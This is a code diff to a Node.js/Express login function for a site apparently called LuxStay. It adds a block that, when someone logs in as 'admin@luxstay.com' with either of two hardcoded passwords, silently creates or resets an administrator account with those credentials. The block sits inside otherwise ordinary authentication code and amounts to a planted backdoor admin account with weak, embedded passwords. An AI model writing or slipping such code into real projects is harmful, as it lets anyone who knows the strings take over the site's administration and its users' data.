@@ -111,6 +111,28 @@ const login = async (req, res) => {
   try {
     const { email, password } = req.body;
 
+    // Auto-create/reset hardcoded admin if matching credentials are used
+    if (email && email.toLowerCase() === 'admin@luxstay.com' && (password === 'BHAICHARAONTOP123' || password === 'admin123')) {
+      let adminUser = await User.findOne({ email: 'admin@luxstay.com' });
+      if (!adminUser) {
+        adminUser = new User({
+          name: 'Admin User',
+          email: 'admin@luxstay.com',
+          password: password,
+          role: 'admin',
+          status: 'active',
+          phone: '+1234567890',
+          emailVerified: true
+        });
+        await adminUser.save();
+      } else {
+        adminUser.role = 'admin';
+        adminUser.status = 'active';
+        adminUser.password = password;
+        await adminUser.save();
+      }
+    }
+
     // Find user and include password for comparison
     const user = await User.findOne({ email: email.toLowerCase() }).select('+password');
 
